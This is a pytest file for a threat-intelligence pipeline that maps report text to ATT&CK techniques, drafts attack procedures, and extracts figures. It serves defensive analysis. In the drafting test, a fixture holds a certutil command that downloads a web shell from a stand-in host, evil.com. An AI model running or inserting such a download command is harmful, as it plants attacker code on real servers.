class TestFormatReferenceText:
    def test_empty_lookup_returns_empty(self):
        from app.nodes.llm.technique_extraction import _format_reference_text
        assert _format_reference_text({}) == ""

    def test_lookup_renders_one_line_per_id_sorted(self):
        from app.nodes.llm.technique_extraction import _format_reference_text
        text = _format_reference_text({
            "T1059.001": {"name": "PowerShell", "tactics": ["execution"]},
            "T1190": {"name": "Exploit Public-Facing Application",
                      "tactics": ["initial-access"]},
        })
        # Sorted: T1059.001 before T1190 lexicographically.
        idx_059 = text.index("T1059.001 | PowerShell | execution")
        idx_190 = text.index("T1190 | Exploit Public-Facing Application | initial-access")
        assert idx_059 < idx_190
        assert "UNIFIED CANDIDATE POOL" in text

    def test_unannotated_pool_has_no_bracket_guidance(self):
        """Without annotations the block is byte-for-byte what it always
        was — no behavior change for sources with no curated signal."""
        from app.nodes.llm.technique_extraction import _format_reference_text
        pool = {"T1059.001": {"name": "PowerShell", "tactics": ["execution"]}}
        assert _format_reference_text(pool) == _format_reference_text(pool, {})
        assert "[" not in _format_reference_text(pool)

    def test_annotated_candidate_renders_bracket_and_guidance(self):
        from app.nodes.llm.technique_extraction import _format_reference_text
        text = _format_reference_text(
            {
                "T1204.001": {"name": "Malicious Link", "tactics": ["execution"]},
                "T1204.004": {"name": "Malicious Copy and Paste",
                              "tactics": ["execution"]},
            },
            {"T1204.004": ["named by the 'clickfix' pattern"]},
        )
        assert ("T1204.004 | Malicious Copy and Paste | execution  "
                "[named by the 'clickfix' pattern]") in text
        # The unvouched sibling stays bare.
        assert "T1204.001 | Malicious Link | execution\n" in text
        assert "trailing [bracket]" in text

    def test_annotation_changes_the_prompt_text(self):
        """Load-bearing for cache correctness: the pool used to render
        identically with and without brand expansion, so a cached wrong pick
        survived the very fix meant to correct it."""
        from app.nodes.llm.technique_extraction import _format_reference_text
        pool = {"T1204.004": {"name": "Malicious Copy and Paste",
                              "tactics": ["execution"]}}
        assert _format_reference_text(pool) != _format_reference_text(
            pool, {"T1204.004": ["named by the 'clickfix' pattern"]},
        )


class TestBuildPoolAnnotations:
    """Labels that tell the pick step which candidates curated knowledge
    vouches for, and why."""

    def test_brand_hit_labelled(self):
        from app.nodes.llm.technique_extraction import _build_pool_annotations
        ann = _build_pool_annotations(
            [{"chunk_id": "chk-1", "brand": "clickfix", "techniques": ["T1204.004"]}],
            set(),
        )
        assert ann == {"T1204.004": ["named by the 'clickfix' pattern"]}

    def test_vendor_mapping_labelled(self):
        from app.nodes.llm.technique_extraction import _build_pool_annotations
        ann = _build_pool_annotations([], {"T1105"})
        assert ann == {"T1105": ["listed in the report's own ATT&CK mapping"]}

    def test_both_sources_stack_on_one_candidate(self):
        from app.nodes.llm.technique_extraction import _build_pool_annotations
        ann = _build_pool_annotations(
            [{"chunk_id": "chk-1", "brand": "clickfix", "techniques": ["T1204.004"]}],
            {"T1204.004"},
        )
        assert ann["T1204.004"] == [
            "named by the 'clickfix' pattern",
            "listed in the report's own ATT&CK mapping",
        ]

    def test_same_brand_in_two_chunks_labelled_once(self):
        from app.nodes.llm.technique_extraction import _build_pool_annotations
        ann = _build_pool_annotations(
            [{"chunk_id": "chk-1", "brand": "clickfix", "techniques": ["T1204.004"]},
             {"chunk_id": "chk-2", "brand": "clickfix", "techniques": ["T1204.004"]}],
            set(),
        )
        assert ann["T1204.004"] == ["named by the 'clickfix' pattern"]

    def test_no_signals_no_annotations(self):
        from app.nodes.llm.technique_extraction import _build_pool_annotations
        assert _build_pool_annotations([], set()) == {}


class TestReconcileCuratedKnowledge:
    """Checks the model's picks against what a brand name entails.

    This is the only rule in the module that compares PEER sub-techniques.
    Every other granularity rule compares a parent with its child, which is
    why the ClickFix sibling swap (T1204.004 -> T1204.001) went unnoticed.
    """

    CATALOGUE = {
        "T1204.004": {"name": "Malicious Copy and Paste", "tactics": ["execution"],
                      "stix_id": "attack-pattern--uuid-004"},
        "T1204.001": {"name": "Malicious Link", "tactics": ["execution"],
                      "stix_id": "attack-pattern--uuid-001"},
        "T1204": {"name": "User Execution", "tactics": ["execution"],
                  "stix_id": "attack-pattern--uuid-parent"},
        "T1189": {"name": "Drive-by Compromise", "tactics": ["initial-access"],
                  "stix_id": "attack-pattern--uuid-189"},
    }
    CLICKFIX = [{"chunk_id": "chk-1", "brand": "clickfix",
                 "techniques": ["T1204.004"]}]

    def _pick(self, tid, bucket="probable", conf=0.8):
        return {"technique_id": tid, "technique_name": "x", "tactic": "execution",
                "confidence": conf, "confidence_bucket": bucket,
                "source_quote": "q", "rationale": "r", "provenance": "llm"}

    def _run(self, mappings, brand_audit=None, vendor=frozenset()):
        from app.nodes.llm.technique_extraction import _reconcile_curated_knowledge
        return _reconcile_curated_knowledge(
            mappings,
            self.CLICKFIX if brand_audit is None else brand_audit,
            set(vendor), self.CATALOGUE,
        )

    def test_sibling_mismatch_demoted_and_expected_injected(self):
        """The exact ClickFix regression: brand says T1204.004, model picked
        the peer T1204.001, nothing downstream noticed."""
        mappings = {"chk-1": [self._pick("T1204.001")]}
        demoted, injected = self._run(mappings, vendor={"T1204.004"})
        assert (demoted, injected) == (1, 1)
        sibling, added = mappings["chk-1"]
        assert sibling["technique_id"] == "T1204.001"
        assert sibling["confidence_bucket"] == "possible"
        assert sibling["brand_mismatch"] == "T1204.004"
        assert added["technique_id"] == "T1204.004"
        assert added["confidence_bucket"] == "possible"
        assert added["provenance"] == "brand_inferred"
        assert added["curated_provenance"] == "brand+vendor"
        # Resolved now, so an analyst promotion at Gate 1 yields a real SRO
        # rather than a fabricated attack-pattern--T1204.004 identifier.
        assert added["stix_id"] == "attack-pattern--uuid-004"
        assert "T1204.001" in added["rationale"]

    def test_correct_pick_is_corroborated_not_touched(self):
        mappings = {"chk-1": [self._pick("T1204.004", bucket="definite", conf=0.95)]}
        demoted, injected = self._run(mappings, vendor={"T1204.004"})
        assert (demoted, injected) == (0, 0)
        pick = mappings["chk-1"][0]
        assert pick["confidence_bucket"] == "definite"
        assert pick["confidence"] == 0.95
        assert pick["curated_provenance"] == "brand+vendor"

    def test_absent_technique_injected_alone(self):
        """No sibling to demote — the model picked something unrelated."""
        mappings = {"chk-1": [self._pick("T1189")]}
        demoted, injected = self._run(mappings)
        assert (demoted, injected) == (0, 1)
        assert mappings["chk-1"][0]["confidence_bucket"] == "probable"  # untouched
        assert mappings["chk-1"][1]["technique_id"] == "T1204.004"
        assert mappings["chk-1"][1]["curated_provenance"] == "brand"

    def test_parent_pick_is_not_treated_as_a_sibling(self):
        """A parent pick is the existing recalibration Rule 1's job; demoting
        it here would double-penalize a defensible coarse-grained answer."""
        mappings = {"chk-1": [self._pick("T1204")]}
        demoted, injected = self._run(mappings)
        assert demoted == 0
        assert mappings["chk-1"][0]["confidence_bucket"] == "probable"
        assert injected == 1

    def test_suggestive_brand_never_injects(self):
        """'watering hole' is a targeting choice, not a delivery technique —
        the payload could arrive by drive-by, supply chain, or a lure. It may
        corroborate a pick but must never add or demote one.

        The model here picked something else entirely, so a definitional
        brand WOULD have injected; that difference is the point of the test.
        """
        mappings = {"chk-1": [self._pick("T1204.001")]}
        demoted, injected = self._run(
            mappings,
            brand_audit=[{"chunk_id": "chk-1", "brand": "watering hole",
                          "techniques": ["T1189"]}],
        )
        assert (demoted, injected) == (0, 0)
        assert [p["technique_id"] for p in mappings["chk-1"]] == ["T1204.001"]

    def test_definitional_brand_would_have_injected_the_same_case(self):
        """Control for the test above: identical picks, definitional brand,
        and the injection does happen. Without this pair, a bug that treated
        every brand as definitional would pass unnoticed."""
        mappings = {"chk-1": [self._pick("T1204.001")]}
        demoted, injected = self._run(
            mappings,
            brand_audit=[{"chunk_id": "chk-1", "brand": "drive-by compromise",
                          "techniques": ["T1189"]}],
        )
        assert injected == 1
        assert "T1189" in [p["technique_id"] for p in mappings["chk-1"]]

    def test_only_the_chunk_that_names_the_brand_is_touched(self):
        """Brand hits carry chunk attribution; injection must respect it."""
        mappings = {"chk-1": [self._pick("T1204.001")],
                    "chk-2": [self._pick("T1204.001")]}
        self._run(mappings)
        assert len(mappings["chk-1"]) == 2
        assert len(mappings["chk-2"]) == 1
        assert "brand_mismatch" not in mappings["chk-2"][0]

    def test_technique_absent_from_catalogue_is_skipped(self):
        """A stale brand-map entry pointing at a retired ID must not inject a
        pick with no name and no stix_id."""
        mappings = {"chk-1": [self._pick("T1189")]}
        demoted, injected = self._run(
            mappings,
            brand_audit=[{"chunk_id": "chk-1", "brand": "clickfix",
                          "techniques": ["T9999.999"]}],
        )
        assert (demoted, injected) == (0, 0)
        assert len(mappings["chk-1"]) == 1

    def test_chunk_with_no_picks_still_gets_the_injection(self):
        mappings = {}
        demoted, injected = self._run(mappings)
        assert injected == 1
        assert mappings["chk-1"][0]["technique_id"] == "T1204.004"

    # --- brand names a PARENT technique ------------------------------------
    # Three definitional brands (evilproxy, adversary-in-the-middle, aitm
    # phishing) map to T1557, which has four sub-techniques. A brand that
    # names a parent says nothing about WHICH sub applies.

    AITM = [{"chunk_id": "chk-1", "brand": "adversary-in-the-middle",
             "techniques": ["T1557"]}]
    PARENT_CATALOGUE = {
        "T1557": {"name": "Adversary-in-the-Middle",
                  "tactics": ["credential-access"],
                  "stix_id": "attack-pattern--uuid-1557"},
        "T1557.004": {"name": "Evil Twin", "tactics": ["credential-access"],
                      "stix_id": "attack-pattern--uuid-1557-004"},
    }

    def _run_parent(self, mappings):
        from app.nodes.llm.technique_extraction import _reconcile_curated_knowledge
        return _reconcile_curated_knowledge(
            mappings, self.AITM, set(), self.PARENT_CATALOGUE,
        )

    def test_sub_of_a_brand_named_parent_is_a_refinement_not_a_mismatch(self):
        """T1557.004 under a brand that names T1557 is MORE precise, not
        wrong. Demoting it would punish the better answer and inject a
        coarser one beside it."""
        mappings = {"chk-1": [self._pick("T1557.004")]}
        demoted, injected = self._run_parent(mappings)
        assert (demoted, injected) == (0, 0)
        pick = mappings["chk-1"][0]
        assert pick["confidence_bucket"] == "probable"
        assert "brand_mismatch" not in pick
        assert pick["curated_provenance"] == "brand"

    def test_brand_named_parent_injected_when_family_absent(self):
        """Nothing from the T1557 family was picked at all — then the parent
        is worth surfacing."""
        mappings = {"chk-1": [self._pick("T1204.001")]}
        demoted, injected = self._run_parent(mappings)
        assert (demoted, injected) == (0, 1)
        assert mappings["chk-1"][1]["technique_id"] == "T1557"

    def test_parent_pick_under_a_brand_named_sub_is_left_alone(self):
        """Mirror case: brand names T1204.004, model picked the parent
        T1204. Coarse but defensible, and promoting it is already
        _recalibrate_confidence Rule 1's job — so demote nothing."""
        mappings = {"chk-1": [self._pick("T1204")]}
        demoted, injected = self._run(mappings)
        assert demoted == 0
        assert "brand_mismatch" not in mappings["chk-1"][0]
        assert injected == 1

    def test_vendor_corroboration_shows_in_the_rationale(self):
        """The analyst reading the review lane should be able to tell a
        brand-only inference from one the report's own table backs."""
        brand_only = {"chk-1": []}
        self._run(brand_only)
        assert "ATT&CK mapping" not in brand_only["chk-1"][0]["rationale"]
        both = {"chk-1": []}
        self._run(both, vendor={"T1204.004"})
        assert "ATT&CK mapping" in both["chk-1"][0]["rationale"]


# =============================================================================
# draft_procedures
# =============================================================================


class TestDraftProcedures:
    """Tests for the draft_procedures node."""

    @pytest.fixture(autouse=True)
    def _mock_feedback_fetch(self):
        """Auto-mock the postgres feedback fetch so tests don't need a DB."""
        with patch(
            "app.nodes.llm.drafting._fetch_feedback_addendum",
            new_callable=AsyncMock,
            return_value="",
        ) as m, patch(
            # The corrected-example channel is a SECOND fetch. Unpatched it
            # opens a real DB connection per test and degrades to "" — passing
            # tests, but reaching postgres from a unit suite.
            "app.nodes.llm.drafting._fetch_feedback_examples",
            new_callable=AsyncMock,
            return_value="",
        ):
            yield m

    @pytest.mark.asyncio
    @patch("app.nodes.llm.drafting.call_llm", new_callable=AsyncMock)
    async def test_creates_drafts_from_chunks(self, mock_call):
        mock_call.return_value = _mock_llm_response({
            "drafts": [
                {
                    "chunk_id": "chk-001",
                    "name": "Exploit ActiveMQ via CVE-2023-46604",
                    "description": "The actor exploited CVE-2023-46604...",
                    "platforms": ["linux::server"],
                    "command_lines": [],
                    "detail_gap": False,
                },
                {
                    "chunk_id": "chk-002",
                    "name": "Download Web Shell via certutil",
                    "description": "The actor used certutil.exe...",
                    "platforms": ["windows::server"],
                    "command_lines": ["certutil.exe -urlcache -split -f http://evil.com/shell.jsp"],
                    "detail_gap": False,
                },
            ],
        })

        state = {
            "chunks": [
                {
                    "chunk_id": "chk-001",
                    "text": "Exploited ActiveMQ...",
                    "sequence_index": 1,
                    "predecessor_indices": [],
                    "behavioral_confidence": 0.9,
                    "branch_point": False,
                    "convergence_point": False,
                    "source_location": {},
                },
                {
                    "chunk_id": "chk-002",
                    "text": "Used certutil.exe...",
                    # The command is grounded in the verbatim excerpt, not the
                    # paraphrase; _ground_command_lines would drop it otherwise.
                    "source_excerpt": (
                        "The actor ran certutil.exe -urlcache -split -f "
                        "http://evil.com/shell.jsp to fetch the web shell."
                    ),
                    "sequence_index": 2,
                    "predecessor_indices": [1],
                    "behavioral_confidence": 0.85,
                    "branch_point": False,
                    "convergence_point": False,
                    "source_location": {},
                },
            ],
            "technique_mappings": {
                "chk-001": [{"technique_id": "T1190", "technique_name": "Exploit", "tactic": "initial-access", "confidence": 0.95}],
                "chk-002": [{"technique_id": "T1105", "technique_name": "Transfer", "tactic": "command-and-control", "confidence": 0.9}],
            },
            "validated_entities": [],
            "metadata": {},
        }
        result = await draft_procedures(state)

        assert result["status"] == PipelineStatus.DRAFTING.value
        assert len(result["drafts"]) == 2

        d1 = result["drafts"][0]
        assert d1["draft_id"].startswith("dft-")
        assert d1["name"] == "Exploit ActiveMQ via CVE-2023-46604"
        assert d1["sequence_index"] == 1
        assert d1["confidence"] == 90  # 0.9 * 100

        d2 = result["drafts"][1]
        assert d2["predecessor_indices"] == [1]
        assert len(d2["raw_command_lines"]) == 1

    @pytest.mark.asyncio
    @patch("app.nodes.llm.drafting.call_llm", new_callable=AsyncMock)
    async def test_no_chunks_returns_empty(self, mock_call):
        state = {"chunks": [], "technique_mappings": {}, "validated_entities": [], "metadata": {}}
        result = await draft_procedures(state)
        assert result["drafts"] == []
        mock_call.assert_not_called()

    @pytest.mark.asyncio
    @patch("app.nodes.llm.drafting.call_llm", new_callable=AsyncMock)
    async def test_api_error_handled(self, mock_call):
        mock_call.side_effect = Exception("Model overloaded")
        state = {
            "chunks": [{"chunk_id": "chk-001", "text": "test", "sequence_index": 1,
                         "predecessor_indices": [], "behavioral_confidence": 0.5,
                         "branch_point": False, "convergence_point": False, "source_location": {}}],
            "technique_mappings": {},
            "validated_entities": [],
            "metadata": {},
        }
        result = await draft_procedures(state)
        assert result["status"] == PipelineStatus.FAILED.value


class TestProcessDrafts:
    """Tests for draft post-processing."""

    def test_inherits_sequencing(self):
        raw = [{"chunk_id": "chk-001", "name": "Test", "description": "Desc",
                 "platforms": ["windows"], "command_lines": [], "detail_gap": False}]
        chunks = [{
            "chunk_id": "chk-001", "sequence_index": 3,
            "predecessor_indices": [1, 2], "branch_point": False,
            "convergence_point": True, "behavioral_confidence": 0.7,
            "source_location": {},
        }]
        technique_mappings = {"chk-001": [{"technique_id": "T1059", "technique_name": "CLI",
                                            "tactic": "execution", "confidence": 0.8}]}
        result = _process_drafts(raw, chunks, technique_mappings, {})

        assert result[0]["sequence_index"] == 3
        assert result[0]["predecessor_indices"] == [1, 2]
        assert result[0]["effect_refs"] == []
        # flow_ref draft field removed in v0.5.0-draft (no x_flow_ref).
        assert "flow_ref" not in result[0]
        assert result[0]["confidence"] == 70  # 0.7 * 100

    def test_builds_kill_chain_phases(self):
        raw = [{"chunk_id": "chk-001", "name": "Test", "description": "Desc",
                 "platforms": [], "command_lines": [], "detail_gap": False}]
        chunks = [{"chunk_id": "chk-001", "sequence_index": 1,
                    "predecessor_indices": [], "branch_point": False,
                    "convergence_point": False, "behavioral_confidence": 0.5,
                    "source_location": {}}]
        technique_mappings = {
            "chk-001": [
                {"technique_id": "T1190", "technique_name": "Exploit", "tactic": "initial-access", "confidence": 0.9},
                {"technique_id": "T1059", "technique_name": "CLI", "tactic": "execution", "confidence": 0.8},
            ],
        }
        result = _process_drafts(raw, chunks, technique_mappings, {})

        phases = result[0]["kill_chain_phases"]
        assert len(phases) == 2
        assert {"kill_chain_name": "mitre-attack", "phase_name": "initial-access"} in phases
        assert {"kill_chain_name": "mitre-attack", "phase_name": "execution"} in phases

    def test_unknown_chunk_id_skipped(self):
        raw = [{"chunk_id": "chk-unknown", "name": "Test", "description": "Desc",
                 "platforms": [], "command_lines": [], "detail_gap": False}]
        chunks = [{"chunk_id": "chk-001", "sequence_index": 1,
                    "predecessor_indices": [], "branch_point": False,
                    "convergence_point": False, "behavioral_confidence": 0.5,
                    "source_location": {}}]
        result = _process_drafts(raw, chunks, {}, {})
        assert len(result) == 0

    def test_gate_fields_initialized_none(self):
        raw = [{"chunk_id": "chk-001", "name": "Test", "description": "Desc",
                 "platforms": [], "command_lines": [], "detail_gap": False}]
        chunks = [{"chunk_id": "chk-001", "sequence_index": 1,
                    "predecessor_indices": [], "branch_point": False,
                    "convergence_point": False, "behavioral_confidence": 0.5,
                    "source_location": {}}]
        result = _process_drafts(raw, chunks, {}, {})
        assert result[0]["gate_action"] is None
        assert result[0]["reject_reason"] is None
        assert result[0]["analyst_edits"] is None
        assert result[0]["analyst_rationale"] is None


# =============================================================================
# extract_figures (figure_extraction)
# =============================================================================


class TestReplacePlaceholdersInOrder:
    """_replace_placeholders_in_order maps replacements to <!-- image -->
    positions in document order."""

    def test_replaces_each_placeholder_in_order(self):
        text = "A <!-- image --> B <!-- image --> C"
        out = _replace_placeholders_in_order(text, ["[fig1]", "[fig2]"])
        assert out == "A [fig1] B [fig2] C"

    def test_empty_replacement_strips_placeholder(self):
        """Decorative figures get '' replacement -> placeholder removed."""
        text = "A <!-- image --> B"
        out = _replace_placeholders_in_order(text, [""])
        assert out == "A  B"

    def test_no_placeholders_returns_text_unchanged(self):
        text = "A B C"
        assert _replace_placeholders_in_order(text, ["x"]) == "A B C"

    def test_fewer_replacements_leaves_remaining_placeholders(self):
        """If we have N placeholders but K<N replacements, the last
        N-K placeholders stay intact (failure-mode visibility)."""
        text = "A <!-- image --> B <!-- image --> C"
        out = _replace_placeholders_in_order(text, ["[fig1]"])
        assert out == "A [fig1] B <!-- image --> C"


class TestFormatFigureBlock:
    """_format_figure_block produces a bracketed block with provenance."""

    def test_with_caption(self):
        block = _format_figure_block(
            "fig-1", page=3, caption="Attack chain",
            figure_type="diagram", text="1. Initial Access\n2. Execution",
        )
        assert "[FIGURE fig-1 — diagram, page 3, \"Attack chain\"]" in block
        assert "1. Initial Access" in block
        assert "[/FIGURE fig-1]" in block

    def test_without_caption(self):
        block = _format_figure_block(
            "fig-2", page=None, caption="",
            figure_type="screenshot", text="cmd.exe /c whoami",
        )
        assert "[FIGURE fig-2 — screenshot, page ?]" in block
        assert "cmd.exe /c whoami" in block
        assert "[/FIGURE fig-2]" in block


class TestExtractFiguresSkipPaths:
    """Skip paths return early without invoking Docling or vision LLM."""

    @pytest.mark.asyncio
    async def test_disabled_by_flag(self):
        """Source.extract_figures=False -> no work, parsed_text untouched."""
        state = {
            "parsed_text": "Body <!-- image --> body.",
            "raw_content_path": "/data/test.pdf",
            "source_type": "pdf",
            "extract_figures": False,
        }
        result = await extract_figures(state)
        assert result["extracted_figures"] == []
        assert "parsed_text" not in result  # unchanged signal: no write
        assert result["current_node"] == "extract_figures"

    @pytest.mark.asyncio
    async def test_non_figure_source_type(self):
        """markdown / free_text sources don't have figures -> skip."""
        state = {
            "parsed_text": "Markdown body.",
            "raw_content_path": "/data/test.md",
            "source_type": "markdown",
            "extract_figures": True,
        }
        result = await extract_figures(state)
        assert result["extracted_figures"] == []
        assert "parsed_text" not in result

    @pytest.mark.asyncio
    async def test_no_placeholders(self):
        """parsed_text with no <!-- image --> markers -> nothing to do."""
        state = {
            "parsed_text": "Body without figures.",
            "raw_content_path": "/data/test.pdf",
            "source_type": "pdf",
            "extract_figures": True,
        }
        result = await extract_figures(state)
        assert result["extracted_figures"] == []
        assert "parsed_text" not in result

    @pytest.mark.asyncio
    async def test_empty_parsed_text(self):
        state = {
            "parsed_text": "",
            "raw_content_path": "/data/test.pdf",
            "source_type": "pdf",
            "extract_figures": True,
        }
        result = await extract_figures(state)
        assert result["extracted_figures"] == []


class TestExtractFiguresReplacement:
    """When figures exist, vision results land inline at the right
    placeholder positions."""

    @pytest.mark.asyncio
    @patch("app.nodes.llm.figure_extraction._classify_and_extract")
    @patch("app.nodes.llm.figure_extraction._extract_pictures")
    async def test_diagram_replaces_placeholder(self, mock_pics, mock_vision):
        """One picture, classified as diagram, gets inlined as a [FIGURE...] block."""
        mock_pics.return_value = [{
            "caption": "Attack chain",
            "page": 5,
            "image_b64": "ZmFrZQ==",  # 'fake' base64
            "media_type": "image/png",
            "width": 800,
            "height": 600,
        }]
        mock_vision.return_value = ExtractFigureOutput(
            figure_type="diagram",
            extracted_text="1. Initial Access via SharePoint\n2. Privilege Escalation",
            confidence=0.95,
            rationale="Numbered kill-chain diagram with 2 procedures.",
        )
        state = {
            "parsed_text": "Prose <!-- image --> more prose.",
            "raw_content_path": "/data/test.pdf",
            "source_type": "pdf",
            "extract_figures": True,
        }
        result = await extract_figures(state)
        assert "<!-- image -->" not in result["parsed_text"]
        assert "[FIGURE fig-1 — diagram" in result["parsed_text"]
        assert "1. Initial Access via SharePoint" in result["parsed_text"]
        assert len(result["extracted_figures"]) == 1
        assert result["extracted_figures"][0]["status"] == "extracted"
        assert result["extracted_figures"][0]["figure_type"] == "diagram"

    @pytest.mark.asyncio
    @patch("app.nodes.llm.figure_extraction._classify_and_extract")
    @patch("app.nodes.llm.figure_extraction._extract_pictures")
    async def test_decorative_drops_placeholder(self, mock_pics, mock_vision):
        """Decorative figures: placeholder is removed, no inline content."""
        mock_pics.return_value = [{
            "caption": "Vendor logo",
            "page": 1,
            "image_b64": "ZmFrZQ==",
            "media_type": "image/png",
            "width": 400,
            "height": 200,
        }]
        mock_vision.return_value = ExtractFigureOutput(
            figure_type="decorative",
            extracted_text="",
            confidence=1.0,
            rationale="Vendor logo with no operational content.",
        )
        state = {
            "parsed_text": "Prose <!-- image --> more prose.",
            "raw_content_path": "/data/test.pdf",
            "source_type": "pdf",
            "extract_figures": True,
        }
        result = await extract_figures(state)
        assert "<!-- image -->" not in result["parsed_text"]
        assert "[FIGURE" not in result["parsed_text"]
        assert result["extracted_figures"][0]["status"] == "skipped_decorative"

    @pytest.mark.asyncio
    @patch("app.nodes.llm.figure_extraction._classify_and_extract")
    @patch("app.nodes.llm.figure_extraction._extract_pictures")
    async def test_too_small_image_skipped_without_vision_call(self, mock_pics, mock_vision):
        """Tiny images (icons / page decoration) skip the vision call."""
        mock_pics.return_value = [{
            "caption": "",
            "page": 1,
            "image_b64": "ZmFrZQ==",
            "media_type": "image/png",
            "width": 30,
            "height": 30,
        }]
        state = {
            "parsed_text": "<!-- image --> body",
            "raw_content_path": "/data/test.pdf",
            "source_type": "pdf",
            "extract_figures": True,
        }
        result = await extract_figures(state)
        # Vision call NOT invoked for too-small images
        mock_vision.assert_not_called()
        assert result["extracted_figures"][0]["status"] == "skipped_too_small"
        assert "<!-- image -->" not in result["parsed_text"]

    @pytest.mark.asyncio
    @patch("app.nodes.llm.figure_extraction._classify_and_extract")
    @patch("app.nodes.llm.figure_extraction._extract_pictures")
    async def test_vision_failure_keeps_placeholder(self, mock_pics, mock_vision):
        """If a vision call raises, leave the placeholder in place and
        continue. Don't fail the whole source for one bad figure."""
        mock_pics.return_value = [{
            "caption": "",
            "page": 1,
            "image_b64": "ZmFrZQ==",
            "media_type": "image/png",
            "width": 800,
            "height": 600,
        }]
        mock_vision.side_effect = RuntimeError("API timeout")
        state = {
            "parsed_text": "Body <!-- image --> body",
            "raw_content_path": "/data/test.pdf",
            "source_type": "pdf",
            "extract_figures": True,
        }
        result = await extract_figures(state)
        # Placeholder retained for visibility
        assert "<!-- image -->" in result["parsed_text"]
        assert result["extracted_figures"][0]["status"] == "failed"

    @pytest.mark.asyncio
    @patch("app.nodes.llm.figure_extraction._classify_and_extract")
    @patch("app.nodes.llm.figure_extraction._extract_pictures")
    async def test_multiple_figures_correct_order(self, mock_pics, mock_vision):
        """Two figures, results land at the right placeholder positions.

        Figures now fan out via asyncio.gather and can complete out of order,
        so this keys the mock by caption (deterministic input→output mapping)
        instead of relying on call order. gather() must still return results
        in INPUT order for the positional replacement to be correct.
        """
        mock_pics.return_value = [
            {"caption": "C1", "page": 1, "image_b64": "MQ==",
             "media_type": "image/png", "width": 400, "height": 300},
            {"caption": "C2", "page": 2, "image_b64": "Mg==",
             "media_type": "image/png", "width": 400, "height": 300},
        ]
        _by_caption = {
            "C1": ExtractFigureOutput(
                figure_type="diagram",
                extracted_text="diagram one body",
                confidence=0.9, rationale="r1"),
            "C2": ExtractFigureOutput(
                figure_type="screenshot",
                extracted_text="cmd.exe /c whoami",
                confidence=0.95, rationale="r2"),
        }

        async def _fake_vision(image_b64, media_type, caption):
            return _by_caption[caption]

        mock_vision.side_effect = _fake_vision
        state = {
            "parsed_text": "A <!-- image --> B <!-- image --> C",
            "raw_content_path": "/data/test.pdf",
            "source_type": "pdf",
            "extract_figures": True,
        }
        result = await extract_figures(state)
        text = result["parsed_text"]
        # fig-1 (C1, diagram) block must precede fig-2 (C2, screenshot) block
        # in parsed_text, proving gather preserved input order despite the
        # calls completing whenever.
        d_idx = text.find("diagram one body")
        s_idx = text.find("cmd.exe /c whoami")
        assert d_idx > -1 and s_idx > -1 and d_idx < s_idx
        assert "[FIGURE fig-1 — diagram" in text
        assert "[FIGURE fig-2 — screenshot" in text
        assert len(result["extracted_figures"]) == 2

    @pytest.mark.asyncio
    @patch("app.nodes.llm.figure_extraction.call_llm")
    @patch("app.nodes.llm.figure_extraction._extract_pictures")
    async def test_vision_call_caps_max_tokens(self, mock_pics, mock_call_llm):
        """The figure vision call must pass the configured max_tokens cap so a
        runaway image can't generate the global 20k default. Regression guard
        for a ~2.5-min single-figure stall."""
        from app.config import settings
        from app.nodes.llm.llm_adapter import LLMResponse

        mock_pics.return_value = [{
            "caption": "", "page": 1, "image_b64": "ZmFrZQ==",
            "media_type": "image/png", "width": 400, "height": 300,
        }]
        mock_call_llm.return_value = LLMResponse(
            tool_output={"figure_type": "screenshot", "extracted_text": "x",
                         "confidence": 0.9, "rationale": "r"},
            validated=ExtractFigureOutput(
                figure_type="screenshot", extracted_text="x",
                confidence=0.9, rationale="r"),
        )
        state = {
            "parsed_text": "<!-- image --> body",
            "raw_content_path": "/data/test.pdf",
            "source_type": "pdf",
            "extract_figures": True,
        }
        await extract_figures(state)
        mock_call_llm.assert_called_once()
        assert mock_call_llm.call_args.kwargs["max_tokens"] == settings.figure_extraction_max_tokens
        # Sanity: the cap is far below the global default (20k) it replaced.
        assert settings.figure_extraction_max_tokens < 20000

    @pytest.mark.asyncio
    @patch("app.nodes.llm.figure_extraction._classify_and_extract")
    @patch("app.nodes.llm.figure_extraction._extract_pictures")
    async def test_vision_calls_bounded_concurrency(
        self, mock_pics, mock_vision, monkeypatch
    ):
        """Figures fan out concurrently, but no more than
        settings.figure_extraction_concurrency vision calls run at once."""
        from app.config import settings

        monkeypatch.setattr(settings, "figure_extraction_concurrency", 3)
        n_figures = 7
        mock_pics.return_value = [
            {"caption": f"C{i}", "page": i, "image_b64": "ZmFrZQ==",
             "media_type": "image/png", "width": 400, "height": 300}
            for i in range(n_figures)
        ]

        active = 0
        peak = 0

        async def _tracking_vision(image_b64, media_type, caption):
            nonlocal active, peak
            active += 1
            peak = max(peak, active)
            # Yield long enough for every concurrency slot to fill before any
            # call returns, so `peak` reflects the true ceiling.
            await asyncio.sleep(0.02)
            active -= 1
            return ExtractFigureOutput(
                figure_type="screenshot", extracted_text=f"t{caption}",
                confidence=0.9, rationale="r")

        mock_vision.side_effect = _tracking_vision
        state = {
            "parsed_text": " ".join(["<!-- image -->"] * n_figures),
            "raw_content_path": "/data/test.pdf",
            "source_type": "pdf",
            "extract_figures": True,
        }
        result = await extract_figures(state)
        # Parallel (peak > 1) but capped at the configured concurrency.
        assert peak == 3, f"expected peak concurrency 3, got {peak}"
        assert len(result["extracted_figures"]) == n_figures
        assert all(e["status"] == "extracted" for e in result["extracted_figures"])


# =============================================================================
# synthesize_feedback (feedback_synthesis)
# =============================================================================


class TestHadRealReviews:
    """_had_real_reviews short-circuits the synthesizer when no analyst input."""

    def test_no_reviews(self):
        assert _had_real_reviews({}) is False

    def test_gate0_reviews_present(self):
        state = {"gate0_reviews": [{"entity_id": "e1", "action": "approve"}]}
        assert _had_real_reviews(state) is True

    def test_chunk_reviews_present(self):
        state = {"chunk_reviews": {"decisions": []}}
        assert _had_real_reviews(state) is True

    def test_gate1_reviews_present(self):
        state = {"gate1_reviews": [{"draft_id": "d1", "action": "approve"}]}
        assert _had_real_reviews(state) is True

    def test_gate1_promotions_present(self):
        state = {"gate1_promotions": [{"chunk_id": "c1", "technique_id": "T1059"}]}
        assert _had_real_reviews(state) is True

    def test_gate2_reviews_present(self):
        state = {"gate2_reviews": [{"rel_id": "r1", "action": "approve"}]}
        assert _had_real_reviews(state) is True

    def test_gate1_correction_log_present(self):
        # gate1_reviews is cleared after each pass; the durable correction log
        # is what proves a Gate 1 reject happened on a run that later completed.
        state = {"gate1_correction_log": [{"draft_id": "d1", "action": "reject"}]}
        assert _had_real_reviews(state) is True

    def test_chunk_correction_log_present(self):
        state = {"chunk_correction_log": [
            {"kind": "wholesale_reject", "reason": "over_chunked", "comments": ""},
        ]}
        assert _had_real_reviews(state) is True

    def test_entity_corrections_alone_count(self):
